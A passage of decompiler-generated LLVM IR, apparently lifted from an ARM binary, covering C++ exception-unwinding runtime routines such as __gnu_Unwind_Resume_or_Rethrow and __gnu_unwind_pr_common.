  uselistorder label %dec_label_pc_18608, { 1, 0 }
  uselistorder label %dec_label_pc_18600, { 1, 0 }
}

define i32 @__gnu_Unwind_Resume_or_Rethrow(i32 %ucbp, i32 %entry_vrs) local_unnamed_addr {
entry:
  %v1_18630 = add i32 %ucbp, 12
  %v2_18630 = inttoptr i32 %v1_18630 to i32*
  %v3_18630 = load i32, i32* %v2_18630, align 4
  %v2_18634 = icmp eq i32 %v3_18630, 0
  br i1 %v2_18634, label %dec_label_pc_1863c, label %dec_label_pc_18640

dec_label_pc_1863c:                               ; preds = %entry
  %v2_1863c = call i32 @__gnu_Unwind_RaiseException(i32 0, i32 %entry_vrs)
  br label %dec_label_pc_18640

dec_label_pc_18640:                               ; preds = %entry, %dec_label_pc_1863c
  %v1_18640 = add i32 %entry_vrs, 60
  %v2_18640 = inttoptr i32 %v1_18640 to i32*
  %v3_18640 = load i32, i32* %v2_18640, align 4
  %v2_18648 = add i32 %entry_vrs, 64
  %v3_18648 = inttoptr i32 %v2_18648 to i32*
  store i32 %v3_18640, i32* %v3_18648, align 4
  %v3_1864c = call i32 @unwind_phase2_forced(i32 0, i32 %entry_vrs, i32 0)
  ret i32 %v3_1864c

; uselistorder directives
  uselistorder i32 (i32, i32, i32)* @unwind_phase2_forced, { 2, 0, 1 }
  uselistorder i32 %entry_vrs, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_18640, { 1, 0 }
}

define i32 @_Unwind_VRS_Pop(i32 %context, i32 %regclass, i32 %discriminator, i32 %representation) local_unnamed_addr {
entry:
  %tmp = icmp ult i32 %regclass, 5
  br i1 %tmp, label %bb, label %dec_label_pc_186ac

bb:                                               ; preds = %entry
  %v7_18664 = mul i32 %regclass, 4
  %v8_18664 = add i32 %v7_18664, ptrtoint (i32* @global_var_1866c.711 to i32)
  call void @__pseudo_branch(i32 %v8_18664)
  br label %dec_label_pc_186ac

dec_label_pc_186ac:                               ; preds = %bb, %entry
  ret i32 2

; uselistorder directives
  uselistorder i32 %regclass, { 1, 0 }
}

define i32 @__gnu_unwind_pr_common(i32 %state, i32 %ucbp, i32 %context, i32 %id) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %context, i32* %r2.global-to-local, align 4
  store i32 %state, i32* %r0.global-to-local, align 4
  %forced_unwind_-44 = alloca i32, align 4
  %uws_-60 = alloca %anon_struct_4, align 8
  %stack_var_-48 = alloca i32, align 4
  %v3_18794 = load i32, i32* @r4, align 4
  %v6_18794 = load i32, i32* @r5, align 4
  %v2_187a4 = icmp eq i32 %id, 0
  store i32 %ucbp, i32* @r8, align 4
  %v1_187ac = add i32 %ucbp, 76
  %v2_187ac = inttoptr i32 %v1_187ac to i32*
  %v3_187ac = load i32, i32* %v2_187ac, align 4
  %v1_187b8 = inttoptr i32 %v3_187ac to i32*
  %v2_187b8 = load i32, i32* %v1_187b8, align 4
  store i32 %v2_187b8, i32* @lr, align 4
  %v4_187b8 = add i32 %v3_187ac, 4
  store i32 %context, i32* %fp.global-to-local, align 4
  %v1_187c4 = urem i32 %state, 4
  store i32 %v1_187c4, i32* %r2.global-to-local, align 4
  %v1_187c8 = and i32 %state, 8
  store i32 %v1_187c8, i32* %r0.global-to-local, align 4
  %v4_187d8 = getelementptr inbounds %anon_struct_4, %anon_struct_4* %uws_-60, i32 0, i32 0
  store i32 %v2_187b8, i32* %v4_187d8, align 8
  br i1 %v2_187a4, label %dec_label_pc_187e8, label %dec_label_pc_18ac4

dec_label_pc_187e8:                               ; preds = %entry
  %v3_187e8 = mul i32 %v2_187b8, 256
  store i32 %v3_187e8, i32* %v4_187d8, align 8
  store i32 3, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_18800

dec_label_pc_18800:                               ; preds = %dec_label_pc_18ac4, %dec_label_pc_187e8
  %v0_18824647090 = phi i32 [ %v2_18adc, %dec_label_pc_18ac4 ], [ %v4_187b8, %dec_label_pc_187e8 ]
  store i32 %v1_187c4, i32* %r2.global-to-local, align 4
  %v1_18804 = add i32 %ucbp, 80
  %v2_18804 = inttoptr i32 %v1_18804 to i32*
  %v3_18804 = load i32, i32* %v2_18804, align 4
  %v7_18808 = icmp eq i32 %v1_187c4, 2
  br i1 %v7_18808, label %bb, label %bb148

bb:                                               ; preds = %dec_label_pc_18800
  %v2_1880c = add i32 %ucbp, 56
  %v3_1880c = inttoptr i32 %v2_1880c to i32*
  %v4_1880c = load i32, i32* %v3_1880c, align 4
  br label %bb148

bb148:                                            ; preds = %dec_label_pc_18800, %bb
  %v0_188246470 = phi i32 [ %v0_18824647090, %dec_label_pc_18800 ], [ %v4_1880c, %bb ]
  %v1_18810 = urem i32 %v3_18804, 2
  %v2_18810 = icmp eq i32 %v1_18810, 0
  br i1 %v2_18810, label %dec_label_pc_18824.preheader, label %bb149

bb149:                                            ; preds = %bb148
  br label %dec_label_pc_188e4

dec_label_pc_18824.preheader:                     ; preds = %bb148
  %v1_188246571 = inttoptr i32 %v0_188246470 to i32*
  %v2_188246672 = load i32, i32* %v1_188246571, align 4
  %v2_188286874 = icmp eq i32 %v2_188246672, 0
  br i1 %v2_188286874, label %dec_label_pc_188e4, label %dec_label_pc_18830.preheader.lr.ph.lr.ph

dec_label_pc_18830.preheader.lr.ph.lr.ph:         ; preds = %dec_label_pc_18824.preheader
  %v7_18834 = icmp eq i32 %id, 2
  %v2_188c0 = icmp eq i32 %v1_187c4, 0
  %v2_18a8c = ptrtoint i32* %forced_unwind_-44 to i32
  %v3_189a8 = icmp eq i32 %v1_187c8, 0
  br label %dec_label_pc_18830.preheader.lr.ph

dec_label_pc_18830.preheader.lr.ph:               ; preds = %dec_label_pc_18830.preheader.lr.ph.lr.ph, %dec_label_pc_18af8
  %v1_1884096 = phi i32 [ %v2_188246672, %dec_label_pc_18830.preheader.lr.ph.lr.ph ], [ %v2_1882466, %dec_label_pc_18af8 ]
  %v1_1883c93 = phi i32 [ %v0_188246470, %dec_label_pc_18830.preheader.lr.ph.lr.ph ], [ %v2_18afc, %dec_label_pc_18af8 ]
  %stack_var_-76.2.ph3175 = phi i32 [ 0, %dec_label_pc_18830.preheader.lr.ph.lr.ph ], [ %stack_var_-76.4, %dec_label_pc_18af8 ]
  br label %dec_label_pc_18830.preheader

dec_label_pc_18830.preheader:                     ; preds = %dec_label_pc_18830.preheader.lr.ph, %dec_label_pc_18abc
  %v1_1884095 = phi i32 [ %v1_1884096, %dec_label_pc_18830.preheader.lr.ph ], [ %v2_18824, %dec_label_pc_18abc ]
  %v1_1883c92 = phi i32 [ %v1_1883c93, %dec_label_pc_18830.preheader.lr.ph ], [ %v1_18abc, %dec_label_pc_18abc ]
  br label %dec_label_pc_18830

dec_label_pc_18830:                               ; preds = %dec_label_pc_18830.preheader, %dec_label_pc_188d4
  %v1_18840 = phi i32 [ %v1_1884095, %dec_label_pc_18830.preheader ], [ %v2_188d8, %dec_label_pc_188d4 ]
  %v1_18854 = phi i32 [ %v1_1883c92, %dec_label_pc_18830.preheader ], [ %v1_188d4, %dec_label_pc_188d4 ]
  store i32 %id, i32* %r2.global-to-local, align 4
  br i1 %v7_18834, label %bb151, label %.thread16

bb151:                                            ; preds = %dec_label_pc_18830
  %v2_18838 = add i32 %v1_18854, 4
  %v3_18838 = inttoptr i32 %v2_18838 to i32*
  %v4_18838 = load i32, i32* %v3_18838, align 4
  store i32 %v4_18838, i32* @r5, align 4
  store i32 %v1_18840, i32* @r6, align 4
  %v0_18844109 = load i32, i32* @r8, align 4
  %v1_18844110 = add i32 %v0_18844109, 72
  %v2_18844111 = inttoptr i32 %v1_18844110 to i32*
  %v3_18844112 = load i32, i32* %v2_18844111, align 4
  store i32 %v3_18844112, i32* @lr, align 4
  %v2_18850 = add i32 %v1_18854, 8
  br label %bb152

.thread16:                                        ; preds = %dec_label_pc_18830
  %v2_1883c = add i32 %v1_18854, 2
  %v3_1883c = inttoptr i32 %v2_1883c to i16*
  %v4_1883c = load i16, i16* %v3_1883c, align 2
  %v5_1883c = zext i16 %v4_1883c to i32
  store i32 %v5_1883c, i32* @r5, align 4
  %v0_18844 = load i32, i32* @r8, align 4
  %v1_18844 = add i32 %v0_18844, 72
  %v2_18844 = inttoptr i32 %v1_18844 to i32*
  %v3_18844 = load i32, i32* %v2_18844, align 4
  store i32 %v3_18844, i32* @lr, align 4
  %v2_1884c = inttoptr i32 %v1_18854 to i16*
  %v3_1884c = load i16, i16* %v2_1884c, align 2
  %v4_1884c = zext i16 %v3_1884c to i32
  store i32 %v4_1884c, i32* @r6, align 4
  %v2_18854 = add i32 %v1_18854, 4
  br label %bb152

bb152:                                            ; preds = %bb151, %.thread16
  %storemerge121 = phi i32 [ %v2_18854, %.thread16 ], [ %v2_18850, %bb151 ]
  %v3_18844115 = phi i32 [ %v3_18844, %.thread16 ], [ %v3_18844112, %bb151 ]
  %v0_1885c113 = phi i32 [ %v5_1883c, %.thread16 ], [ %v4_18838, %bb151 ]
  store i32 %storemerge121, i32* @r7, align 4
  %v1_1885c = and i32 %v0_1885c113, -2
  %v2_18860 = add i32 %v1_1885c, %v3_18844115
  store i32 %v2_18860, i32* @r4, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v0_18870 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_18870, i32* %r0.global-to-local, align 4
  %v5_1887c = call i32 @_Unwind_VRS_Get(i32 %v0_18870, i32 15, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_1887c, i32* %r0.global-to-local, align 4
  %v3_18880 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_18880, i32* %r2.global-to-local, align 4
  %v0_18884 = load i32, i32* @r4, align 4
  %tmp = icmp ugt i32 %v0_18884, %v3_18880
  br i1 %tmp, label %._crit_edge, label %dec_label_pc_18890

._crit_edge:                                      ; preds = %bb152
  %v0_188a8.pre = load i32, i32* @r6, align 4
  br label %bb154

dec_label_pc_18890:                               ; preds = %bb152
  %v0_18890 = load i32, i32* @r6, align 4
  %v1_18890 = and i32 %v0_18890, -2
  %v2_18894 = add i32 %v1_18890, %v0_18884
  %v3_18898 = icmp ult i32 %v3_18880, %v2_18894
  br i1 %v3_18898, label %.thread20, label %bb153

bb153:                                            ; preds = %dec_label_pc_18890
  br label %bb154

.thread20:                                        ; preds = %dec_label_pc_18890
  br label %bb154

bb154:                                            ; preds = %bb153, %._crit_edge, %.thread20
  %v0_188a8 = phi i32 [ %v0_188a8.pre, %._crit_edge ], [ %v0_18890, %bb153 ], [ %v0_18890, %.thread20 ]
  %v0_18a50 = phi i32 [ 0, %._crit_edge ], [ 0, %bb153 ], [ 1, %.thread20 ]
  %v0_188a4 = load i32, i32* @r5, align 4
  %v1_188a8 = urem i32 %v0_188a8, 2
  %v1_188a4 = mul i32 %v0_188a4, 2
  %v3_188ac = and i32 %v1_188a4, 2
  %v4_188ac = or i32 %v3_188ac, %v1_188a8
  store i32 %v4_188ac, i32* %r2.global-to-local, align 4
  %v7_188b0 = icmp eq i32 %v4_188ac, 1
  br i1 %v7_188b0, label %dec_label_pc_18a44, label %dec_label_pc_188b8

dec_label_pc_188b8:                               ; preds = %bb154
  %v2_188b0 = icmp eq i32 %v4_188ac, 0
  br i1 %v2_188b0, label %dec_label_pc_188bc, label %dec_label_pc_1896c

dec_label_pc_188bc:                               ; preds = %dec_label_pc_188b8
  store i32 %v1_187c4, i32* %r2.global-to-local, align 4
  br i1 %v2_188c0, label %.thread, label %bb155

.thread:                                          ; preds = %dec_label_pc_188bc
  %v0_188d4119 = load i32, i32* @r7, align 4
  br label %dec_label_pc_188d4

bb155:                                            ; preds = %dec_label_pc_188bc
  %v2_188cc = icmp eq i32 %v0_18a50, 0
  %v0_188d4 = load i32, i32* @r7, align 4
  br i1 %v2_188cc, label %dec_label_pc_188d4, label %dec_label_pc_18c4c

dec_label_pc_188d4:                               ; preds = %.thread, %bb155
  %v0_188d4120 = phi i32 [ %v0_188d4119, %.thread ], [ %v0_188d4, %bb155 ]
  %v1_188d4 = add i32 %v0_188d4120, 4
  %v1_188d8 = inttoptr i32 %v1_188d4 to i32*
  %v2_188d8 = load i32, i32* %v1_188d8, align 4
  %v2_188dc = icmp eq i32 %v2_188d8, 0
  br i1 %v2_188dc, label %dec_label_pc_188e4, label %dec_label_pc_18830

dec_label_pc_188e4:                               ; preds = %dec_label_pc_18af8, %dec_label_pc_18abc, %dec_label_pc_188d4, %dec_label_pc_18824.preheader, %bb149
  %stack_var_-76.3 = phi i32 [ 0, %bb149 ], [ 0, %dec_label_pc_18824.preheader ], [ %stack_var_-76.2.ph3175, %dec_label_pc_188d4 ], [ %stack_var_-76.2.ph3175, %dec_label_pc_18abc ], [ %stack_var_-76.4, %dec_label_pc_18af8 ]
  %v0_188e4 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_188e4, i32* %r0.global-to-local, align 4
  %tmp156 = bitcast %anon_struct_4* %uws_-60 to %anon_struct_13*
  %v4_188ec = call i32 @__gnu_unwind_execute(i32 %v0_188e4, %anon_struct_13* %tmp156)
  store i32 %v4_188ec, i32* %r0.global-to-local, align 4
  store i32 %v4_188ec, i32* %r5.global-to-local, align 4
  %v2_188f0 = icmp eq i32 %v4_188ec, 0
  br i1 %v2_188f0, label %dec_label_pc_188f8, label %dec_label_pc_18974

dec_label_pc_188f8:                               ; preds = %dec_label_pc_188e4
  store i32 %stack_var_-76.3, i32* %r2.global-to-local, align 4
  %v2_188fc = icmp eq i32 %stack_var_-76.3, 0
  br i1 %v2_188fc, label %bb157, label %dec_label_pc_18908

bb157:                                            ; preds = %dec_label_pc_188f8
  store i32 8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18978

dec_label_pc_18908:                               ; preds = %dec_label_pc_188f8
  %v2_18908 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_18908, i32* %r4.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v0_18918 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_18918, i32* %r0.global-to-local, align 4
  %tmp158 = bitcast i32* %stack_var_-48 to i8*
  %v7_18920 = call i32 @_Unwind_VRS_Get(i32 %v0_18918, i32 0, i32 15, i32 0, i8* %tmp158)
  %v0_18924 = load i32, i32* %r5.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 %v0_18918, i32* %r0.global-to-local, align 4
  %v5_18938 = call i32 @_Unwind_VRS_Set(i32 %v0_18918, i32 %v0_18924, i32 14, i32 %v0_18924, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_18938, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23104.179 to i32), i32* %r2.global-to-local, align 4
  %v4_18944 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 36) to i32*), align 4
  %v0_18948 = load i32, i32* %r5.global-to-local, align 4
  %v0_1894c = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_1894c, i32* %r0.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 %v4_18944, i32* %stack_var_-48, align 4
  %v5_18960 = call i32 @_Unwind_VRS_Set(i32 %v0_1894c, i32 %v0_18948, i32 15, i32 %v0_18948, i8* bitcast (i32* @0 to i8*))
  store i32 7, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18978

dec_label_pc_1896c:                               ; preds = %dec_label_pc_188b8
  %v7_1896c = icmp eq i32 %v4_188ac, 2
  br i1 %v7_1896c, label %dec_label_pc_18984, label %dec_label_pc_18974

dec_label_pc_18974:                               ; preds = %dec_label_pc_1896c, %dec_label_pc_18a58, %dec_label_pc_188e4, %dec_label_pc_18c4c
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18978

dec_label_pc_18978:                               ; preds = %bb157, %dec_label_pc_18c84, %dec_label_pc_18c14, %bb166, %dec_label_pc_18908, %dec_label_pc_18974
  %v1_18980 = phi i32 [ 8, %bb157 ], [ 7, %dec_label_pc_18c84 ], [ %v1_18980.pre, %dec_label_pc_18c14 ], [ 7, %bb166 ], [ 7, %dec_label_pc_18908 ], [ 9, %dec_label_pc_18974 ]
  store i32 %v3_18794, i32* %r4.global-to-local, align 4
  store i32 %v6_18794, i32* %r5.global-to-local, align 4
  ret i32 %v1_18980

dec_label_pc_18984:                               ; preds = %dec_label_pc_1896c
  store i32 %v1_187c4, i32* %r2.global-to-local, align 4
  %v0_18988 = load i32, i32* @r7, align 4
  %v1_18988 = inttoptr i32 %v0_18988 to i32*
  %v2_18988 = load i32, i32* %v1_18988, align 4
  %tmp206 = bitcast i32 %v2_18988 to float
  %tmp207 = call float @fabsf(float %tmp206)
  %v1_18990 = bitcast float %tmp207 to i32
  store i32 %v1_18990, i32* @sl, align 4
  br i1 %v2_188c0, label %dec_label_pc_18998, label %dec_label_pc_18b04

dec_label_pc_18998:                               ; preds = %dec_label_pc_18984
  %v2_18998 = icmp eq i32 %v0_18a50, 0
  br i1 %v2_18998, label %dec_label_pc_18aec, label %dec_label_pc_189a0

dec_label_pc_189a0:                               ; preds = %dec_label_pc_18998
  %v2_189a4 = icmp eq i32 %v1_18990, 0
  br i1 %v2_189a4, label %dec_label_pc_189b0.thread, label %bb159

dec_label_pc_189b0.thread:                        ; preds = %dec_label_pc_189a0
  br label %dec_label_pc_18c14

bb159:                                            ; preds = %dec_label_pc_189a0
  br i1 %v3_189a8, label %dec_label_pc_189b8, label %dec_label_pc_18aec

dec_label_pc_189b8:                               ; preds = %bb159
  %v1_189b8 = add i32 %v0_18988, 4
  store i32 %v1_189b8, i32* @r6, align 4
  store i32 108, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  %v0_189c8 = load i32, i32* @r8, align 4
  %v1_189c8 = add i32 %v0_189c8, 88
  store i32 %v1_189c8, i32* %sb.global-to-local, align 4
  store i32 %v1_189b8, i32* @r4, align 4
  br label %dec_label_pc_189ec

dec_label_pc_189dc:                               ; preds = %bb161
  %v1_189dc = add i32 %v0_189dc, 1
  store i32 %v1_189dc, i32* @r5, align 4
  %v1_189e0 = load i32, i32* @sl, align 4
  %v9_189e0 = icmp eq i32 %v1_189dc, %v1_189e0
  %v0_189e4 = load i32, i32* @r4, align 4
  %v1_189e4 = add i32 %v0_189e4, 4
  store i32 %v1_189e4, i32* @r4, align 4
  br i1 %v9_189e0, label %dec_label_pc_18c14, label %dec_label_pc_189dc.dec_label_pc_189ec_crit_edge

dec_label_pc_189dc.dec_label_pc_189ec_crit_edge:  ; preds = %dec_label_pc_189dc
  %v0_189f8.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_189ec

dec_label_pc_189ec:                               ; preds = %dec_label_pc_189dc.dec_label_pc_189ec_crit_edge, %dec_label_pc_189b8
  %v0_189f8 = phi i32 [ %v0_189f8.pre, %dec_label_pc_189dc.dec_label_pc_189ec_crit_edge ], [ %v1_189c8, %dec_label_pc_189b8 ]
  %v1_189fc = phi i32 [ %v1_189e4, %dec_label_pc_189dc.dec_label_pc_189ec_crit_edge ], [ %v1_189b8, %dec_label_pc_189b8 ]
  %v1_189ec = inttoptr i32 %v1_189fc to i32*
  %v2_189ec = load i32, i32* %v1_189ec, align 4
  %v2_189f0 = icmp eq i32 %v2_189ec, 0
  store i32 %v0_189f8, i32* %forced_unwind_-44, align 4
  br i1 %v2_189f0, label %bb161, label %bb160

bb160:                                            ; preds = %dec_label_pc_189ec
  br label %bb161

bb161:                                            ; preds = %dec_label_pc_189ec, %bb160
  %v0_18a00 = load i32, i32* @r8, align 4
  store i32 %v0_18a00, i32* %r0.global-to-local, align 4
  store i32 %v2_18a8c, i32* %r2.global-to-local, align 4
  %v4_18a10 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 108) to i32*), align 4
  store i32 100892, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_18a10)
  %v0_18a1c = load i32, i32* %r0.global-to-local, align 4
  %v2_18a1c = icmp eq i32 %v0_18a1c, 0
  %v0_189dc = load i32, i32* @r5, align 4
  br i1 %v2_18a1c, label %dec_label_pc_189dc, label %dec_label_pc_18a24

dec_label_pc_18a24:                               ; preds = %bb161
  %v1_18a24 = load i32, i32* @sl, align 4
  %v9_18a24 = icmp eq i32 %v0_189dc, %v1_18a24
  br i1 %v9_18a24, label %dec_label_pc_18c14, label %dec_label_pc_18a2c

dec_label_pc_18a2c:                               ; preds = %dec_label_pc_18a24
  %v0_18a2c = load i32, i32* @r7, align 4
  %v1_18a2c = inttoptr i32 %v0_18a2c to i32*
  %v2_18a2c = load i32, i32* %v1_18a2c, align 4
  %v1_18a30 = icmp slt i32 %v2_18a2c, 0
  %v0_18a38.pre = load i32, i32* @r6, align 4
  br i1 %v1_18a30, label %dec_label_pc_18a38, label %dec_label_pc_18af8

dec_label_pc_18a38:                               ; preds = %dec_label_pc_18a2c, %dec_label_pc_18af0
  %v0_18a38 = phi i32 [ %storemerge, %dec_label_pc_18af0 ], [ %v0_18a38.pre, %dec_label_pc_18a2c ]
  store i32 %v0_18a38, i32* %r0.global-to-local, align 4
  %v1_18a3c = add i32 %v0_18a38, 4
  store i32 %v1_18a3c, i32* @r6, align 4
  br label %dec_label_pc_18af8

dec_label_pc_18a44:                               ; preds = %bb154
  store i32 %v1_187c4, i32* %r2.global-to-local, align 4
  br i1 %v2_188c0, label %dec_label_pc_18a50, label %dec_label_pc_18b3c

dec_label_pc_18a50:                               ; preds = %dec_label_pc_18a44
  %v2_18a50 = icmp eq i32 %v0_18a50, 0
  br i1 %v2_18a50, label %dec_label_pc_18abc, label %dec_label_pc_18a58

dec_label_pc_18a58:                               ; preds = %dec_label_pc_18a50
  %v0_18a58 = load i32, i32* @r7, align 4
  %v1_18a58 = add i32 %v0_18a58, 4
  %v2_18a58 = inttoptr i32 %v1_18a58 to i32*
  %v3_18a58 = load i32, i32* %v2_18a58, align 4
  %v7_18a5c = icmp eq i32 %v3_18a58, -2
  store i32 %v1_18a58, i32* %r2.global-to-local, align 4
  br i1 %v7_18a5c, label %dec_label_pc_18974, label %dec_label_pc_18a68

dec_label_pc_18a68:                               ; preds = %dec_label_pc_18a58
  %v0_18a68 = load i32, i32* @r8, align 4
  %v1_18a68 = add i32 %v0_18a68, 88
  %v7_18a6c = icmp eq i32 %v3_18a58, -1
  store i32 %v1_18a68, i32* %forced_unwind_-44, align 4
  br i1 %v7_18a6c, label %dec_label_pc_18ab0, label %dec_label_pc_18a78

dec_label_pc_18a78:                               ; preds = %dec_label_pc_18a68
  %v2_18a7c = icmp eq i32 %v3_18a58, 0
  br i1 %v2_18a7c, label %bb163, label %bb162

bb162:                                            ; preds = %dec_label_pc_18a78
  br label %bb163

bb163:                                            ; preds = %dec_label_pc_18a78, %bb162
  store i32 %v0_18a68, i32* %r0.global-to-local, align 4
  store i32 %v2_18a8c, i32* %r2.global-to-local, align 4
  %v4_18a98 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 108) to i32*), align 4
  store i32 101028, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_18a98)
  %v0_18aa4 = load i32, i32* %r0.global-to-local, align 4
  %v2_18aa4 = icmp eq i32 %v0_18aa4, 0
  br i1 %v2_18aa4, label %bb164, label %.thread25

.thread25:                                        ; preds = %bb163
  %v3_18ab0.pr = load i32, i32* %forced_unwind_-44, align 4
  br label %dec_label_pc_18ab0

bb164:                                            ; preds = %bb163
  store i32 0, i32* %forced_unwind_-44, align 4
  br label %dec_label_pc_18abc

dec_label_pc_18ab0:                               ; preds = %.thread25, %dec_label_pc_18a68
  %v3_18ab0 = phi i32 [ %v3_18ab0.pr, %.thread25 ], [ %v1_18a68, %dec_label_pc_18a68 ]
  %v2_18ab4 = icmp eq i32 %v3_18ab0, 0
  br i1 %v2_18ab4, label %dec_label_pc_18abc, label %dec_label_pc_18c14

dec_label_pc_18abc:                               ; preds = %bb164, %dec_label_pc_18b68, %dec_label_pc_18b3c, %dec_label_pc_18ab0, %dec_label_pc_18a50
  %v0_18abc = load i32, i32* @r7, align 4
  %v1_18abc = add i32 %v0_18abc, 8
  %v1_18824 = inttoptr i32 %v1_18abc to i32*
  %v2_18824 = load i32, i32* %v1_18824, align 4
  %v2_18828 = icmp eq i32 %v2_18824, 0
  br i1 %v2_18828, label %dec_label_pc_188e4, label %dec_label_pc_18830.preheader

dec_label_pc_18ac4:                               ; preds = %entry
  %v3_18ac4 = udiv i32 %v2_187b8, 65536
  store i32 2, i32* %r2.global-to-local, align 4
  %v6_18ad4 = mul nuw nsw i32 %v3_18ac4, 4
  %v3_18ad8 = mul i32 %v2_187b8, 65536
  %v2_18adc = add i32 %v6_18ad4, %v4_187b8
  store i32 %v3_18ad8, i32* %v4_187d8, align 8
  br label %dec_label_pc_18800

dec_label_pc_18aec:                               ; preds = %bb159, %dec_label_pc_18998
  %v1_18aec = add i32 %v0_18988, 4
  br label %dec_label_pc_18af0

dec_label_pc_18af0:                               ; preds = %dec_label_pc_18b30, %dec_label_pc_18aec
  %v0_18af0 = phi i32 [ %v2_18b30, %dec_label_pc_18b30 ], [ %v2_18988, %dec_label_pc_18aec ]
  %storemerge = phi i32 [ %v4_18b30, %dec_label_pc_18b30 ], [ %v1_18aec, %dec_label_pc_18aec ]
  store i32 %storemerge, i32* @r6, align 4
  %v1_18af0 = icmp slt i32 %v0_18af0, 0
  br i1 %v1_18af0, label %dec_label_pc_18a38, label %dec_label_pc_18af8

dec_label_pc_18af8:                               ; preds = %dec_label_pc_18a2c, %dec_label_pc_18af0, %dec_label_pc_18c04, %dec_label_pc_18a38
  %v0_18afc = phi i32 [ %v1_18a3c, %dec_label_pc_18a38 ], [ %storemerge, %dec_label_pc_18af0 ], [ %v1_18c08, %dec_label_pc_18c04 ], [ %v0_18a38.pre, %dec_label_pc_18a2c ]
  %stack_var_-76.4 = phi i32 [ %stack_var_-76.2.ph3175, %dec_label_pc_18a38 ], [ %stack_var_-76.2.ph3175, %dec_label_pc_18af0 ], [ %v1_18c04, %dec_label_pc_18c04 ], [ %stack_var_-76.2.ph3175, %dec_label_pc_18a2c ]
  %v0_18af8 = load i32, i32* @sl, align 4
  %v3_18af8 = mul i32 %v0_18af8, 4
  %v2_18afc = add i32 %v3_18af8, %v0_18afc
  %v1_1882465 = inttoptr i32 %v2_18afc to i32*
  %v2_1882466 = load i32, i32* %v1_1882465, align 4
  %v2_1882868 = icmp eq i32 %v2_1882466, 0
  br i1 %v2_1882868, label %dec_label_pc_188e4, label %dec_label_pc_18830.preheader.lr.ph

dec_label_pc_18b04:                               ; preds = %dec_label_pc_18984
  %v0_18b14 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_18b14, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v0_18b1c = load i32, i32* @r8, align 4
  %v1_18b1c = add i32 %v0_18b1c, 32
  %v2_18b1c = inttoptr i32 %v1_18b1c to i32*
  %v3_18b1c = load i32, i32* %v2_18b1c, align 4
  store i32 %v3_18b1c, i32* @r4, align 4
  %v5_18b20 = call i32 @_Unwind_VRS_Get(i32 %v0_18b14, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_18b20, i32* %r0.global-to-local, align 4
  %v3_18b24 = load i32, i32* %stack_var_-48, align 4
  %v0_18b28 = load i32, i32* @r4, align 4
  %v9_18b28 = icmp eq i32 %v0_18b28, %v3_18b24
  br i1 %v9_18b28, label %dec_label_pc_18bd0, label %dec_label_pc_18b04.dec_label_pc_18b30_crit_edge

dec_label_pc_18b04.dec_label_pc_18b30_crit_edge:  ; preds = %dec_label_pc_18b04
  %v0_18b30.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_18b30

dec_label_pc_18b30:                               ; preds = %dec_label_pc_18b04.dec_label_pc_18b30_crit_edge, %dec_label_pc_18bd0
  %v0_18b30 = phi i32 [ %v0_18b30.pre, %dec_label_pc_18b04.dec_label_pc_18b30_crit_edge ], [ %v1_18bd4, %dec_label_pc_18bd0 ]
  %v1_18b30 = inttoptr i32 %v0_18b30 to i32*
  %v2_18b30 = load i32, i32* %v1_18b30, align 4
  %v4_18b30 = add i32 %v0_18b30, 4
  store i32 %v4_18b30, i32* @r7, align 4
  br label %dec_label_pc_18af0

dec_label_pc_18b3c:                               ; preds = %dec_label_pc_18a44
  %v0_18b4c = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_18b4c, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v0_18b54 = load i32, i32* @r8, align 4
  %v1_18b54 = add i32 %v0_18b54, 32
  %v2_18b54 = inttoptr i32 %v1_18b54 to i32*
  %v3_18b54 = load i32, i32* %v2_18b54, align 4
  store i32 %v3_18b54, i32* @r4, align 4
  %v5_18b58 = call i32 @_Unwind_VRS_Get(i32 %v0_18b4c, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_18b58, i32* %r0.global-to-local, align 4
  %v3_18b5c = load i32, i32* %stack_var_-48, align 4
  %v0_18b60 = load i32, i32* @r4, align 4
  %v9_18b60 = icmp eq i32 %v0_18b60, %v3_18b5c
  br i1 %v9_18b60, label %dec_label_pc_18b68, label %dec_label_pc_18abc

dec_label_pc_18b68:                               ; preds = %dec_label_pc_18b3c
  %v0_18b68 = load i32, i32* @r8, align 4
  %v1_18b68 = add i32 %v0_18b68, 40
  %v2_18b68 = inttoptr i32 %v1_18b68 to i32*
